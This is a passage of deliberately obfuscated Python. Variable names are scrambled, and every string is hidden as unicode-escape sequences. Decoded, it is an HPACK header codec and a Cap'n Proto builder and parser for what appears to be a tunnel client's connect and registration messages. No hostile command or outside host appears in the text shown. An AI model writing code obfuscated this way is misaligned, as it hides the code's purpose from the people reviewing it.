                O0_var_678 = HUFFMAN_TREE
                O0_var_679 = 0
                O0_var_680 = 0
    if O0_var_680 > 7 or O0_var_679 != (1 << O0_var_680) - 1:
        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
    return bytes(O0_var_677)

def O0_fn_7(data, O0_var_684, O0_var_685):
    if O0_var_684 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
    O0_var_686 = data[O0_var_684]
    O0_var_684 += 1
    O0_var_687 = (1 << O0_var_685) - 1
    O0_var_688 = O0_var_686 & O0_var_687
    if O0_var_688 < O0_var_687:
        return (O0_var_688, O0_var_684)
    O0_var_689 = 0
    while True:
        if O0_var_684 >= len(data):
            raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
        O0_var_690 = data[O0_var_684]
        O0_var_684 += 1
        O0_var_688 += (O0_var_690 & 127) << O0_var_689
        if O0_var_690 & 128 == 0:
            return (O0_var_688, O0_var_684)
        O0_var_689 += 7
        if O0_var_689 > 28:
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))

def O0_fn_8(data, O0_var_691):
    if O0_var_691 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
    O0_var_692 = bool(data[O0_var_691] & 128)
    O0_var_693, O0_var_691 = O0_fn_7(data, O0_var_691, 7)
    O0_var_694 = O0_var_691 + O0_var_693
    if O0_var_694 > len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'))
    O0_var_695 = data[O0_var_691:O0_var_694]
    return (O0_fn_6(O0_var_695) if O0_var_692 else O0_var_695, O0_var_694)

class HpackDecoder:

    def __init__(self):
        self.dynamic = deque()
        self.dynamic_size = 0
        self.max_size = 4096

    def table_entry(self, O0_var_696):
        if O0_var_696 <= 0:
            raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'))
        if O0_var_696 <= len(STATIC_TABLE):
            return STATIC_TABLE[O0_var_696 - 1]
        O0_var_697 = O0_var_696 - len(STATIC_TABLE) - 1
        if O0_var_697 < 0 or O0_var_697 >= len(self.dynamic):
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'))
        return self.dynamic[O0_var_697]

    def add(self, name, O0_var_698):
        O0_var_699 = 32 + len(name) + len(O0_var_698)
        if O0_var_699 > self.max_size:
            self.dynamic.clear()
            self.dynamic_size = 0
            return
        while self.dynamic and self.dynamic_size + O0_var_699 > self.max_size:
            O0_var_700, O0_var_701 = self.dynamic.pop()
            self.dynamic_size -= 32 + len(O0_var_700) + len(O0_var_701)
        self.dynamic.appendleft((name, O0_var_698))
        self.dynamic_size += O0_var_699

    def decode(self, data):
        O0_var_702 = []
        O0_var_703 = 0
        while O0_var_703 < len(data):
            O0_var_704 = data[O0_var_703]
            if O0_var_704 & 128:
                O0_var_705, O0_var_703 = O0_fn_7(data, O0_var_703, 7)
                O0_var_702.append(self.table_entry(O0_var_705))
                continue
            if O0_var_704 & 64:
                O0_var_705, O0_var_703 = O0_fn_7(data, O0_var_703, 6)
                if O0_var_705:
                    O0_var_706 = self.table_entry(O0_var_705)[0]
                else:
                    O0_var_707, O0_var_703 = O0_fn_8(data, O0_var_703)
                    O0_var_706 = O0_var_707.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
                O0_var_708, O0_var_703 = O0_fn_8(data, O0_var_703)
                O0_var_709 = O0_var_708.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                self.add(O0_var_706, O0_var_709)
                O0_var_702.append((O0_var_706, O0_var_709))
                continue
            if O0_var_704 & 32:
                O0_var_710, O0_var_703 = O0_fn_7(data, O0_var_703, 5)
                if O0_var_710 > 4096:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u0020\\u0073\\u0069\\u007a\\u0065\\u0020\\u0065\\u0078\\u0063\\u0065\\u0065\\u0064\\u0073\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'))
                self.max_size = O0_var_710
                while self.dynamic and self.dynamic_size > O0_var_710:
                    O0_var_711, O0_var_712 = self.dynamic.pop()
                    self.dynamic_size -= 32 + len(O0_var_711) + len(O0_var_712)
                continue
            O0_var_705, O0_var_703 = O0_fn_7(data, O0_var_703, 4)
            if O0_var_705:
                O0_var_706 = self.table_entry(O0_var_705)[0]
            else:
                O0_var_707, O0_var_703 = O0_fn_8(data, O0_var_703)
                O0_var_706 = O0_var_707.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
            O0_var_708, O0_var_703 = O0_fn_8(data, O0_var_703)
            O0_var_702.append((O0_var_706, O0_var_708.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))))
        return O0_var_702

def O0_fn_9(O0_var_713, O0_var_714, O0_var_715):
    O0_var_716 = (1 << O0_var_714) - 1
    if O0_var_713 < O0_var_716:
        return bytes((O0_var_715 | O0_var_713,))
    O0_var_717 = bytearray((O0_var_715 | O0_var_716,))
    O0_var_713 -= O0_var_716
    while O0_var_713 >= 128:
        O0_var_717.append(O0_var_713 & 127 | 128)
        O0_var_713 >>= 7
    O0_var_717.append(O0_var_713)
    return bytes(O0_var_717)

def O0_fn_10(O0_var_718):
    O0_var_719 = O0_var_718.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_718, str) else O0_var_718
    return O0_fn_9(len(O0_var_719), 7, 0) + O0_var_719

def O0_fn_11(headers):
    O0_var_720 = bytearray()
    for O0_var_721, O0_var_722 in headers:
        if O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'):
            O0_var_720.append(136)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape'):
            O0_var_720.append(137)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape'):
            O0_var_720.append(138)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape'):
            O0_var_720.append(139)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape'):
            O0_var_720.append(140)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape'):
            O0_var_720.append(141)
        elif O0_var_721 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_722 == codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape'):
            O0_var_720.append(142)
        else:
            O0_var_720.extend(O0_fn_9(0, 4, 0))
            O0_var_720.extend(O0_fn_10(O0_var_721))
            O0_var_720.extend(O0_fn_10(O0_var_722))
    return bytes(O0_var_720)

class CapnpBuilder:

    def __init__(self):
        self.words = []

    def alloc(self, O0_var_723):
        O0_var_724 = len(self.words)
        self.words.extend([0] * O0_var_723)
        return O0_var_724

    def struct_ptr(self, O0_var_725, O0_var_726, O0_var_727, O0_var_728):
        O0_var_729 = O0_var_726 - O0_var_725 - 1
        O0_var_730 = O0_var_729 << 2 & 4294967292
        O0_var_731 = O0_var_727 & 65535 | (O0_var_728 & 65535) << 16
        self.words[O0_var_725] = O0_var_730 | O0_var_731 << 32

    def set_u8(self, O0_var_732, O0_var_733, O0_var_734):
        O0_var_735 = 255 << O0_var_733 * 8
        self.words[O0_var_732] = self.words[O0_var_732] & ~O0_var_735 | (O0_var_734 & 255) << O0_var_733 * 8

    def set_u16(self, O0_var_736, O0_var_737, O0_var_738):
        O0_var_739 = 65535 << O0_var_737 * 8
        self.words[O0_var_736] = self.words[O0_var_736] & ~O0_var_739 | (O0_var_738 & 65535) << O0_var_737 * 8

    def set_u32(self, O0_var_740, O0_var_741, O0_var_742):
        O0_var_743 = 4294967295 << O0_var_741 * 8
        self.words[O0_var_740] = self.words[O0_var_740] & ~O0_var_743 | (O0_var_742 & 4294967295) << O0_var_741 * 8

    def set_u64(self, O0_var_744, O0_var_745):
        self.words[O0_var_744] = O0_var_745 & 18446744073709551615

    def write_bytes(self, O0_var_746, O0_var_747, text=False):
        O0_var_748 = O0_var_747.encode() if isinstance(O0_var_747, str) else bytes(O0_var_747)
        O0_var_749 = len(O0_var_748) + 1 if text else len(O0_var_748)
        O0_var_750 = self.alloc((O0_var_749 + 7) // 8)
        for O0_var_751, O0_var_752 in enumerate(O0_var_748):
            self.set_u8(O0_var_750 + O0_var_751 // 8, O0_var_751 % 8, O0_var_752)
        O0_var_753 = O0_var_750 - O0_var_746 - 1
        O0_var_754 = (O0_var_753 << 2 | 1) & 4294967295
        O0_var_755 = 2 | (O0_var_749 & 536870911) << 3
        self.words[O0_var_746] = O0_var_754 | O0_var_755 << 32

    def write_text_list(self, O0_var_756, O0_var_757):
        if not O0_var_757:
            self.words[O0_var_756] = 0
            return
        O0_var_758 = self.alloc(len(O0_var_757))
        O0_var_759 = O0_var_758 - O0_var_756 - 1
        self.words[O0_var_756] = (O0_var_759 << 2 | 1) & 4294967295 | (6 | len(O0_var_757) << 3) << 32
        for O0_var_760, O0_var_761 in enumerate(O0_var_757):
            self.write_bytes(O0_var_758 + O0_var_760, O0_var_761, True)

    def write_struct_list(self, O0_var_762, O0_var_763, O0_var_764, O0_var_765, O0_var_766):
        O0_var_767 = self.alloc(1)
        O0_var_768 = O0_var_764 + O0_var_765
        O0_var_769 = self.alloc(O0_var_763 * O0_var_768)
        O0_var_770 = O0_var_767 - O0_var_762 - 1
        self.words[O0_var_762] = (O0_var_770 << 2 | 1) & 4294967295 | (O0_var_763 * O0_var_768 << 3 | 7) << 32
        self.words[O0_var_767] = O0_var_763 << 2 | O0_var_764 << 32 | O0_var_765 << 48
        for O0_var_771 in range(O0_var_763):
            O0_var_766(O0_var_771, O0_var_769 + O0_var_771 * O0_var_768)

    def finish(self):
        return struct.pack(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), 0, len(self.words)) + b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_772) for O0_var_772 in self.words))

def O0_fn_12(O0_var_773):
    O0_var_774 = CapnpBuilder()
    O0_var_775, O0_var_776, O0_var_777 = (O0_var_774.alloc(1), O0_var_774.alloc(1), O0_var_774.alloc(1))
    O0_var_774.struct_ptr(O0_var_775, O0_var_776, 1, 1)
    O0_var_774.set_u16(O0_var_776, 0, 8)
    O0_var_778 = O0_var_774.alloc(1)
    O0_var_774.alloc(1)
    O0_var_774.struct_ptr(O0_var_777, O0_var_778, 1, 1)
    O0_var_774.set_u32(O0_var_778, 0, O0_var_773)
    return O0_var_774.finish()

def O0_fn_13(O0_var_779, O0_var_780, O0_var_781, O0_var_782, O0_var_783, O0_var_784):
    O0_var_785 = CapnpBuilder()
    O0_var_786, O0_var_787, O0_var_788 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_786, O0_var_787, 1, 1)
    O0_var_785.set_u16(O0_var_787, 0, 2)
    O0_var_789, O0_var_790, O0_var_791 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_792, O0_var_793, O0_var_791 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_788, O0_var_789, 3, 3)
    O0_var_785.set_u32(O0_var_789, 0, O0_var_779)
    O0_var_785.set_u64(O0_var_790, 17804583019846587543)
    O0_var_794, O0_var_795 = (O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_792, O0_var_794, 1, 1)
    O0_var_785.set_u16(O0_var_794, 4, 1)
    O0_var_796 = O0_var_785.alloc(1)
    O0_var_785.alloc(1)
    O0_var_785.struct_ptr(O0_var_795, O0_var_796, 1, 1)
    O0_var_785.set_u32(O0_var_796, 0, O0_var_780)
    O0_var_797, O0_var_791 = (O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_793, O0_var_797, 0, 2)
    O0_var_798, O0_var_799, O0_var_800, O0_var_801 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_797, O0_var_798, 1, 3)
    O0_var_785.set_u8(O0_var_798, 0, O0_var_784)
    O0_var_802, O0_var_803 = (O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_799, O0_var_802, 0, 2)
    O0_var_785.write_bytes(O0_var_802, O0_var_781, True)
    O0_var_785.write_bytes(O0_var_803, O0_var_782)
    O0_var_785.write_bytes(O0_var_800, O0_var_783)
    O0_var_804, O0_var_805, O0_var_791 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_801, O0_var_804, 1, 2)
    O0_var_806, O0_var_807, O0_var_808, O0_var_809 = (O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1), O0_var_785.alloc(1))
    O0_var_785.struct_ptr(O0_var_805, O0_var_806, 0, 4)
    O0_var_785.write_bytes(O0_var_806, uuid.uuid4().bytes)
    O0_var_785.write_text_list(O0_var_807, [codecs.decode('\\u0073\\u0065\\u0072\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u005f\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065\\u005f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape')])
    O0_var_785.write_bytes(O0_var_808, codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002e\\u0031\\u0030\\u002e\\u0030\\u002d\\u004e\\u0065\\u0078\\u0075\\u0073', 'unicode_escape'), True)
    O0_var_785.write_bytes(O0_var_809, codecs.decode('\\u004e\\u0065\\u0078\\u0075\\u0073\\u002d\\u0050\\u0079\\u0074\\u0068\\u006f\\u006e', 'unicode_escape'), True)
    return O0_var_785.finish()

def O0_fn_14(O0_var_810):
    O0_var_811 = []
    O0_var_812 = 0
    while len(O0_var_810) - O0_var_812 >= 8:
        O0_var_813, O0_var_814 = struct.unpack_from(codecs.decode('\\u003c\\u0049\\u0049', 'unicode_escape'), O0_var_810, O0_var_812)
        O0_var_815 = O0_var_813 + 1
        O0_var_816 = O0_var_815 + 1
        O0_var_817 = O0_var_816 * 4
        if O0_var_817 % 8:
            O0_var_817 += 4
        if len(O0_var_810) - O0_var_812 < O0_var_817:
            break
        O0_var_818 = [O0_var_814]
        for O0_var_819 in range(1, O0_var_815):
            O0_var_818.append(struct.unpack_from(codecs.decode('\\u003c\\u0049', 'unicode_escape'), O0_var_810, O0_var_812 + 4 + O0_var_819 * 4)[0])
        O0_var_820 = O0_var_817 + sum(O0_var_818) * 8
        if len(O0_var_810) - O0_var_812 < O0_var_820:
            break
        if O0_var_815 != 1:
            raise ValueError(codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u002d\\u0073\\u0065\\u0067\\u006d\\u0065\\u006e\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064', 'unicode_escape'))
        O0_var_811.append(O0_var_810[O0_var_812 + O0_var_817:O0_var_812 + O0_var_820])
        O0_var_812 += O0_var_820
    return (O0_var_811, O0_var_810[O0_var_812:])

def O0_fn_15(O0_var_821, O0_var_822):
    O0_var_823 = O0_var_821[O0_var_822]
    if O0_var_823 & 3 != 0:
        raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072', 'unicode_escape'))
    O0_var_824 = O0_var_823 >> 2 & 1073741823
    if O0_var_824 & 536870912:
        O0_var_824 -= 1073741824
    O0_var_825 = O0_var_822 + 1 + O0_var_824
    O0_var_826 = O0_var_823 >> 32 & 65535
    O0_var_827 = O0_var_823 >> 48 & 65535
    if O0_var_825 < 0 or O0_var_825 + O0_var_826 + O0_var_827 > len(O0_var_821):
        raise ValueError(codecs.decode('\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0070\\u006f\\u0069\\u006e\\u0074\\u0065\\u0072\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0073', 'unicode_escape'))
    return (O0_var_825, O0_var_826, O0_var_827)

def O0_fn_16(O0_var_828, O0_var_829):
    O0_var_830 = O0_var_828[O0_var_829]
    if O0_var_830 & 3 != 1:
        return codecs.decode('', 'unicode_escape')
    O0_var_831 = O0_var_830 >> 2 & 1073741823
    if O0_var_831 & 536870912:
        O0_var_831 -= 1073741824
    O0_var_832 = O0_var_829 + 1 + O0_var_831
    O0_var_833 = O0_var_830 >> 32 & 7
    O0_var_834 = O0_var_830 >> 35
    if O0_var_833 != 2 or O0_var_832 < 0 or O0_var_832 + (O0_var_834 + 7) // 8 > len(O0_var_828):
        return codecs.decode('', 'unicode_escape')
    O0_var_835 = b''.join((struct.pack(codecs.decode('\\u003c\\u0051', 'unicode_escape'), O0_var_836) for O0_var_836 in O0_var_828[O0_var_832:O0_var_832 + (O0_var_834 + 7) // 8]))[:O0_var_834]
    return O0_var_835.rstrip(b'\x00').decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))

def O0_fn_17(data):
    if len(data) % 8 or len(data) < 16:
        raise ValueError(codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e', 'unicode_escape'))
    O0_var_837 = list(struct.unpack(codecs.decode('\\u003c', 'unicode_escape') + codecs.decode('\\u0051', 'unicode_escape') * (len(data) // 8), data))
    O0_var_838, O0_var_839, O0_var_840 = O0_fn_15(O0_var_837, 0)
    if O0_var_839 < 1 or O0_var_837[O0_var_838] & 65535 != 3:
        raise ValueError(codecs.decode('\\u006e\\u006f\\u0074\\u0020\\u0061\\u006e\\u0020\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'))
    O0_var_841, O0_var_842, O0_var_843 = O0_fn_15(O0_var_837, O0_var_838 + O0_var_839)
    O0_var_844 = O0_var_837[O0_var_841] >> 48 & 65535
    if O0_var_844 == 4:
        O0_var_845, O0_var_846, O0_var_847 = O0_fn_15(O0_var_837, O0_var_841 + O0_var_842)
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_fn_16(O0_var_837, O0_var_845 + O0_var_846) or codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')}
    if O0_var_844 != 0:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0052\\u0050\\u0043\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0075\\u006e\\u0069\\u006f\\u006e\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_844}
    O0_var_848, O0_var_849, O0_var_850 = O0_fn_15(O0_var_837, O0_var_841 + O0_var_842)
    if not O0_var_850:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0052\\u0050\\u0043\\u0020\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064', 'unicode_escape')}
    O0_var_851 = O0_var_837[O0_var_848 + O0_var_849]
    if O0_var_851 & 3 == 3:
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0062\\u006f\\u006f\\u0074\\u0073\\u0074\\u0072\\u0061\\u0070', 'unicode_escape'): True}
    O0_var_852, O0_var_853, O0_var_854 = O0_fn_15(O0_var_837, O0_var_848 + O0_var_849)
    if O0_var_853 == 0 and O0_var_854 == 1:
        O0_var_852, O0_var_853, O0_var_854 = O0_fn_15(O0_var_837, O0_var_852 + O0_var_853)
    O0_var_855 = O0_var_837[O0_var_852] & 65535 if O0_var_853 > 0 else 0
    if O0_var_855 == 1:
        O0_var_856, O0_var_857, O0_var_847 = O0_fn_15(O0_var_837, O0_var_852 + O0_var_853)
        O0_var_858 = O0_fn_16(O0_var_837, O0_var_856 + O0_var_857 + 1)
        return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): True, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_858}
    O0_var_859 = O0_fn_16(O0_var_837, O0_var_852 + O0_var_853)
    return {codecs.decode('\\u006f\\u006b', 'unicode_escape'): False, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_var_859 or codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')}

def O0_fn_18(data):
    return list(struct.unpack(codecs.decode('\\u003c', 'unicode_escape') + codecs.decode('\\u0051', 'unicode_escape') * (len(data) // 8), data))

def O0_fn_19(O0_var_860, O0_var_861):
    if O0_var_861 >= len(O0_var_860):
        return None
    O0_var_862 = O0_var_860[O0_var_861]
    if O0_var_862 & 3 != 1 or O0_var_862 >> 32 & 7 != 7:
        return None
    O0_var_863 = O0_var_862 >> 2 & 1073741823
    if O0_var_863 & 536870912:
        O0_var_863 -= 1073741824
    O0_var_864 = O0_var_861 + 1 + O0_var_863
    O0_var_865 = O0_var_862 >> 35
    if O0_var_864 < 0 or O0_var_864 >= len(O0_var_860):
        return None
    O0_var_866 = O0_var_860[O0_var_864]
    if O0_var_866 & 3 != 0:
        return None
    O0_var_867 = O0_var_866 >> 32 & 65535
    O0_var_868 = O0_var_866 >> 48 & 65535
    O0_var_869 = O0_var_866 >> 2 & 1073741823
    O0_var_870 = O0_var_867 + O0_var_868
    if O0_var_868 < 2 or O0_var_870 == 0 or O0_var_870 * O0_var_869 != O0_var_865:
        return None
    if O0_var_864 + 1 + O0_var_870 * O0_var_869 > len(O0_var_860):
        return None
    O0_var_871 = []
    for O0_var_872 in range(O0_var_869):
        O0_var_873 = O0_var_864 + 1 + O0_var_872 * O0_var_870
        O0_var_871.append([O0_fn_16(O0_var_860, O0_var_873 + O0_var_867), O0_fn_16(O0_var_860, O0_var_873 + O0_var_867 + 1)])
    return O0_var_871

def O0_fn_20(data):
    O0_var_874 = O0_fn_18(data)
    if not O0_var_874:
        raise ValueError(codecs.decode('\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0043\\u0061\\u0070\\u0027\\u006e\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0020\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'))
    O0_var_875, O0_var_876, O0_var_877 = O0_fn_15(O0_var_874, 0)
    if O0_var_876 < 1 or O0_var_877 < 2:
        raise ValueError(codecs.decode('\\u0075\\u006e\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u006c\\u0061\\u0079\\u006f\\u0075\\u0074', 'unicode_escape'))
    return {codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape'): O0_fn_16(O0_var_874, O0_var_875 + O0_var_876), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_874[O0_var_875] & 65535, codecs.decode('\\u006d\\u0065\\u0074\\u0061\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'): O0_fn_19(O0_var_874, O0_var_875 + O0_var_876 + 1) or []}

def O0_fn_21(O0_var_878, O0_var_879):
    O0_var_880 = CapnpBuilder()
    O0_var_881 = O0_var_880.alloc(1)
    O0_var_882 = O0_var_880.alloc(2)
    O0_var_880.struct_ptr(O0_var_881, O0_var_882, 0, 2)
    O0_var_880.write_bytes(O0_var_882, O0_var_878 or codecs.decode('', 'unicode_escape'), True)
    O0_var_880.write_struct_list(O0_var_882 + 1, len(O0_var_879), 0, 2, lambda index, base: (O0_var_880.write_bytes(base, O0_var_879[index][0], True), O0_var_880.write_bytes(base + 1, O0_var_879[index][1], True)))
    return O0_var_880.finish()

def O0_fn_22(path):
    O0_var_883 = os.path.splitext(path.rstrip(codecs.decode('\\u002f', 'unicode_escape')))[1].lower()
